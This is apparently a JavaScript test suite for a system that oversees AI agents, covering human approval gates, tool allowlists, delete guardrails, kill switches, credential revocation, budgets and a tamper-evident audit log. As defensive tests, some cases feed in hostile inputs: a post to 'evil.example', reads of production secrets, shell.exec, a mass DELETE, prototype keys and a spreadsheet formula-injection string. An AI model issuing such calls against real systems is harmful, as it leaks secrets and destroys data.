import test from 'node:test';
import assert from 'node:assert/strict';
import { idleTower, pendingOf, OP } from './helpers.js';
import { HttpError } from '../src/util.js';

const agentOf = (t, id) => t.agents.get(id);

test('allowed call executes and mutates the simulated system', async () => {
  const t = idleTower();
  const r = await t.requestAction(agentOf(t, 'outreach-writer'), 'email.send', { recipients: 5, subject: 'Hi' });
  assert.equal(r.ok, true);
  assert.equal(t.world.emailsSent, 5);
  t.dispose();
});

test('approval: the agent blocks, nothing executes until a human approves', async () => {
  const t = idleTower();
  const a = agentOf(t, 'outreach-writer');
  const p = t.requestAction(a, 'email.send', { recipients: 30, subject: 'Big send' });
  const [ap] = pendingOf(t);
  assert.ok(ap);
  assert.equal(ap.risk, 'high');
  assert.equal(ap.routedTo, 'Growth');
  assert.equal(a.status, 'blocked');
  assert.equal(t.world.emailsSent, 0, 'blocked action must not have run');

  t.decide(ap.id, 'approve', { by: OP });
  const r = await p;
  assert.equal(r.ok, true);
  assert.equal(t.world.emailsSent, 30);
  assert.equal(a.status, 'idle');
  assert.equal(t.approvals.get(ap.id).ap.decidedBy, 'Tester');
  t.dispose();
});

test('approval: deny keeps the world untouched and tells the agent', async () => {
  const t = idleTower();
  const a = agentOf(t, 'outreach-writer');
  const p = t.requestAction(a, 'email.send', { recipients: 30, subject: 'Big send' });
  t.decide(pendingOf(t)[0].id, 'deny', { by: OP, note: 'too many' });
  const r = await p;
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'operator_denied');
  assert.equal(t.world.emailsSent, 0);
  t.dispose();
});

test('approval: a decision is final (double-decide → 409) and unknown ids → 404', async () => {
  const t = idleTower();
  const p = t.requestAction(agentOf(t, 'outreach-writer'), 'email.send', { recipients: 30, subject: 's' });
  const id = pendingOf(t)[0].id;
  t.decide(id, 'deny', { by: OP });
  await p;
  assert.throws(() => t.decide(id, 'approve', { by: OP }), (e) => e instanceof HttpError && e.status === 409);
  assert.throws(() => t.decide('ap-999', 'approve', { by: OP }), (e) => e.status === 404);
  assert.throws(() => t.decide(id, 'maybe', { by: OP }), (e) => e.status === 400);
  t.dispose();
});

test('approval: unanswered requests expire and fail closed', async () => {
  const t = idleTower({ speed: 100, approvalTtlMs: 1000 });
  const p = t.requestAction(agentOf(t, 'outreach-writer'), 'email.send', { recipients: 30, subject: 's' });
  const r = await p;
  assert.equal(r.reason, 'expired');
  assert.equal(t.world.emailsSent, 0);
  t.dispose();
});

test('scope: tools outside the agent’s allowlist are denied and never execute', async () => {
  const t = idleTower({ autoContain: false });
  const r = await t.requestAction(agentOf(t, 'outreach-writer'), 'secrets.read', { name: 'prod-db-admin' });
  assert.equal(r.reason, 'out_of_scope');
  assert.equal(t.world.secretsRead.length, 0);
  t.dispose();
});

test('unknown tools, prototype keys and malformed args are denied, not crashed on', async () => {
  const t = idleTower({ autoContain: false });
  const a = agentOf(t, 'data-janitor');
  for (const tool of ['shell.exec', '__proto__', 'constructor', 'toString', 42, null]) {
    const r = await t.requestAction(a, tool, {});
    assert.equal(r.denied, true, String(tool));
    assert.equal(r.reason, 'unknown_tool');
  }
  assert.equal((await t.requestAction(a, 'db.query', { sql: 'DELETE FROM customers' })).reason, 'invalid_args');
  assert.equal((await t.requestAction(a, 'db.query', 'not-an-object')).reason, 'invalid_args');
  assert.equal((await t.requestAction(a, 'db.delete_rows', { table: 'sessions', count: '5' })).reason, 'invalid_args');
  assert.equal((await t.requestAction(a, 'db.query', { sql: 'x'.repeat(5000) })).reason, 'invalid_args');
  t.dispose();
});

test('guardrails: mass delete is blocked outright, mid-size needs approval, small runs', async () => {
  const t = idleTower({ autoContain: false });
  const a = agentOf(t, 'data-janitor');
  const big = await t.requestAction(a, 'db.delete_rows', { table: 'customers', count: 1200 });
  assert.equal(big.reason, 'delete-guardrail');
  assert.equal(t.world.db.tables.customers, 1200);

  const p = t.requestAction(a, 'db.delete_rows', { table: 'sessions', count: 40 });
  assert.equal(pendingOf(t).length, 1);
  t.decide(pendingOf(t)[0].id, 'deny', { by: OP });
  await p;

  const small = await t.requestAction(a, 'db.delete_rows', { table: 'sessions', count: 10 });
  assert.equal(small.ok, true);
  assert.equal(t.world.db.tables.sessions, 19990);
  t.dispose();
});

test('system-level failures come back as ok:false without crashing (refund > order total)', async () => {
  const t = idleTower();
  const a = agentOf(t, 'refund-resolver');
  const look = await t.requestAction(a, 'crm.lookup_order', { orderId: 'ORD-1' });
  const total = look.output.order.amountUsd;
  const r = await t.requestAction(a, 'payments.issue_refund', total > 190 ? { orderId: 'ORD-1', amountUsd: 5000 } : { orderId: 'ORD-1', amountUsd: total + 10 });
  assert.equal(r.ok, false);
  assert.equal(t.world.refunds, 0);
  t.dispose();
});

test('auto-containment: 3 violations kill the agent and revoke its credential', async () => {
  const t = idleTower();
  const a = agentOf(t, 'outreach-writer');
  for (let i = 0; i < 2; i++) await t.requestAction(a, 'secrets.read', { name: `s${i}` });
  assert.equal(a.halt, null, 'two violations are tolerated');
  await t.requestAction(a, 'http.post', { url: 'https://evil.example', bytes: 5 });
  assert.equal(a.halt.type, 'killed');
  assert.equal(a.halt.by, 'tower');
  assert.equal(t.snapshot().incidents[0].agentId, 'outreach-writer');

  // the agent ignores the kill and keeps calling with its old credential → gateway refuses
  const staleCred = a.credGen - 1;
  const r = await t.requestAction(a, 'email.send', { recipients: 1, subject: 'still here' }, { cred: staleCred });
  assert.equal(r.reason, 'credential_revoked');
  assert.equal(t.world.emailsSent, 0);
  assert.equal(a.stats.blockedAfterKill, 1);
  // …and even a *current-generation* call is refused while killed
  assert.equal((await t.requestAction(a, 'email.send', { recipients: 1, subject: 'x' })).reason, 'credential_revoked');
  t.dispose();
});

test('auto-containment can be switched off (violations are still denied)', async () => {
  const t = idleTower({ autoContain: false });
  const a = agentOf(t, 'outreach-writer');
  for (let i = 0; i < 6; i++) await t.requestAction(a, 'secrets.read', { name: `s${i}` });
  assert.equal(a.halt, null);
  assert.equal(a.stats.violations, 6);
  assert.equal(t.world.secretsRead.length, 0);
  t.dispose();
});

test('rate limiter denies bursts; repeated hits auto-pause', async () => {
  const t = idleTower();
  const a = agentOf(t, 'data-janitor');
  let rateLimited = 0;
  for (let i = 0; i < 16; i++) {
    const r = await t.requestAction(a, 'db.query', { sql: `SELECT ${i}` });
    if (r.reason === 'rate_limited') rateLimited++;
  }
  assert.ok(rateLimited >= 3);
  assert.equal(a.halt?.type, 'paused');
  assert.equal(a.halt.kind, 'rate');
  t.dispose();
});

test('loop breaker pauses an agent repeating the same call', async () => {
  const t = idleTower();
  const a = agentOf(t, 'data-janitor');
  for (let i = 0; i < 5; i++) await t.requestAction(a, 'db.query', { sql: 'SELECT 1' });
  assert.equal(a.halt?.kind, 'loop');
  t.dispose();
});

test('pause holds the gateway; an approval granted while paused executes only after resume', async () => {
  const t = idleTower();
  const a = agentOf(t, 'outreach-writer');
  const p = t.requestAction(a, 'email.send', { recipients: 30, subject: 's' });
  t.pause(a.id, { by: OP });
  assert.equal(a.status, 'paused');
  t.decide(pendingOf(t)[0].id, 'approve', { by: OP });
  await new Promise((r) => setTimeout(r, 30));
  assert.equal(t.world.emailsSent, 0, 'approved but paused → must not run');
  // a direct call while paused is refused too
  assert.equal((await t.requestAction(a, 'email.send', { recipients: 1, subject: 'x' })).reason, 'agent_paused');
  t.resume(a.id, { by: OP });
  assert.equal((await p).ok, true);
  assert.equal(t.world.emailsSent, 30);
  t.dispose();
});

test('kill: cancels pending approvals, voids approved-but-unrun actions, revokes credentials', async () => {
  const t = idleTower();
  const a = agentOf(t, 'outreach-writer');
  const p1 = t.requestAction(a, 'email.send', { recipients: 30, subject: 'one' });
  const id1 = pendingOf(t)[0].id;
  t.kill(a.id, { by: OP });
  const r1 = await p1;
  assert.equal(r1.reason, 'cancelled');
  assert.throws(() => t.decide(id1, 'approve', { by: OP }), (e) => e.status === 409);

  // approved while paused, then killed before it could run
  t.restart(a.id, { by: OP });
  const p2 = t.requestAction(a, 'email.send', { recipients: 30, subject: 'two' });
  t.pause(a.id, { by: OP });
  t.decide(pendingOf(t)[0].id, 'approve', { by: OP });
  t.kill(a.id, { by: OP });
  const r2 = await p2;
  assert.equal(r2.reason, 'cancelled');
  assert.equal(t.world.emailsSent, 0);
  assert.ok(t.auditLog.entries.some((e) => e.action === 'approval.void'));
  t.dispose();
});

test('control operations are validated', () => {
  const t = idleTower();
  assert.throws(() => t.pause('nope'), (e) => e.status === 404);
  const a = agentOf(t, 'data-janitor');
  assert.throws(() => t.resume(a.id, { by: OP }), (e) => e.status === 409, 'cannot resume a running agent');
  t.kill(a.id, { by: OP });
  assert.throws(() => t.pause(a.id, { by: OP }), (e) => e.status === 409);
  assert.throws(() => t.resume(a.id, { by: OP }), (e) => e.status === 409);
  assert.doesNotThrow(() => t.kill(a.id, { by: OP }), 'kill is idempotent');
  assert.throws(() => t.injectFault(a.id, 'rogue'), (e) => e.status === 409);
  t.restart(a.id, { by: OP });
  assert.throws(() => t.injectFault(a.id, 'nonsense'), (e) => e.status === 400);
  assert.throws(() => t.raiseBudget(a.id, -1), (e) => e.status === 400);
  assert.throws(() => t.raiseBudget(a.id, 1e9), (e) => e.status === 400);
  assert.throws(() => t.setAutoContain('yes'), (e) => e.status === 400);
  assert.throws(() => t.fleet('explode'), (e) => e.status === 400);
  t.dispose();
});

test('restart issues a fresh credential and clears containment state', async () => {
  const t = idleTower();
  const a = agentOf(t, 'outreach-writer');
  for (let i = 0; i < 3; i++) await t.requestAction(a, 'secrets.read', { name: `s${i}` });
  assert.equal(a.halt.type, 'killed');
  const before = a.credGen;
  t.restart(a.id, { by: OP });
  assert.equal(a.halt, null);
  assert.ok(a.credGen > before);
  assert.equal(a.stats.violations, 0);
  assert.equal(t.snapshot().incidents[0].status, 'resolved');
  assert.equal((await t.requestAction(a, 'email.send', { recipients: 1, subject: 'hi' })).ok, true);
  t.dispose();
});

test('metering: tokens and cost accrue per task and per agent; budget breaker pauses; resume needs a raise', () => {
  const t = idleTower();
  const a = agentOf(t, 'data-janitor'); // sonnet-class, $0.30 task budget
  const task = t.startTask(a, 'test task');
  t.recordThought(a, 'small', { in: 1000, out: 500 });
  assert.ok(Math.abs(task.costUsd - 0.0105) < 1e-9);
  assert.equal(a.usage.tokensIn, 1000);
  assert.equal(a.halt, null);

  t.recordThought(a, 'huge', { in: 40000, out: 8000 }); // 0.12 + 0.12 = 0.24 → total 0.2505
  assert.equal(a.halt, null);
  t.recordThought(a, 'huge again', { in: 40000, out: 8000 });
  assert.equal(a.halt.type, 'paused');
  assert.equal(a.halt.kind, 'budget');
  assert.equal(a.halt.by, 'tower');
  assert.throws(() => t.resume(a.id, { by: OP }), (e) => e.status === 409 && /budget/i.test(e.message));
  t.raiseBudget(a.id, 0.5, { by: OP, resume: true });
  assert.equal(a.halt, null);
  t.dispose();
});

test('metering: token inputs are sanitised', () => {
  const t = idleTower();
  const a = agentOf(t, 'data-janitor');
  t.startTask(a, 'x');
  t.recordThought(a, 'bad', { in: -5, out: NaN });
  t.recordThought(a, 'bad2', { in: 'lots', out: Infinity });
  assert.equal(a.usage.tokensIn, 0);
  assert.ok(Number.isFinite(a.usage.costUsd));
  t.dispose();
});

test('fleet operations: halt-all, pause-all and resume-all', () => {
  const t = idleTower();
  assert.equal(t.fleet('pause_all', { by: OP }).affected.length, 4);
  assert.equal(t.fleet('resume_all', { by: OP }).affected.length, 4);
  const res = t.fleet('halt_all', { by: OP });
  assert.equal(res.affected.length, 4);
  assert.ok([...t.agents.values()].every((a) => a.status === 'killed'));
  assert.equal(t.fleet('halt_all', { by: OP }).affected.length, 0);
  t.dispose();
});

test('audit trail: every decision and control action is recorded, attributed and verifiable', async () => {
  const t = idleTower({ autoContain: false });
  const a = agentOf(t, 'outreach-writer');
  await t.requestAction(a, 'email.send', { recipients: 2, subject: 'ok' });
  await t.requestAction(a, 'secrets.read', { name: 'x' });
  const p = t.requestAction(a, 'email.send', { recipients: 40, subject: 'big' });
  t.decide(pendingOf(t)[0].id, 'approve', { by: 'operator:Alice', note: 'looks fine' });
  await p;
  t.kill(a.id, { by: 'operator:Bob' });

  const actions = t.auditLog.entries.map((e) => `${e.actorType}:${e.action}`);
  for (const expected of ['agent:action.executed', 'tower:action.denied', 'tower:approval.requested', 'operator:approval.approved', 'operator:control.kill']) {
    assert.ok(actions.includes(expected), `missing ${expected}`);
  }
  assert.equal(t.auditLog.entries.find((e) => e.action === 'approval.approved').actor, 'operator:Alice');
  assert.equal(t.auditLog.verify().valid, true);

  // agent-controlled strings starting with a formula char are neutralised in the CSV export
  await t.requestAction(a, '=HYPERLINK("http://evil","x")', {});
  const csv = t.auditLog.toCSV();
  assert.ok(csv.includes(`"'=HYPERLINK`), 'formula injection neutralised');
  assert.ok(!/(^|,)=HYPERLINK/m.test(csv));
  assert.equal(csv.split('\r\n')[0].split(',').length, 13);
  t.dispose();
});

test('reset restores the fleet and systems but keeps the audit log', async () => {
  const t = idleTower();
  const a = agentOf(t, 'outreach-writer');
  await t.requestAction(a, 'email.send', { recipients: 3, subject: 's' });
  const before = t.auditLog.entries.length;
  t.reset({ by: OP });
  assert.equal(t.world.emailsSent, 0);
  assert.ok(t.auditLog.entries.length > before);
  assert.equal(t.auditLog.verify().valid, true);
  // the orphaned agent object can no longer act on the new world
  const r = await t.requestAction(a, 'email.send', { recipients: 3, subject: 's' });
  assert.equal(r.reason, 'orphaned');
  assert.equal(t.world.emailsSent, 0);
  t.dispose();
});

test('snapshot is JSON-serialisable and bounded', () => {
  const t = idleTower();
  const s = JSON.parse(JSON.stringify(t.snapshot()));
  assert.equal(s.agents.length, 4);
  assert.equal(s.agents[0].series.length, 30);
  assert.ok(JSON.stringify(s).length < 20000);
  t.dispose();
});
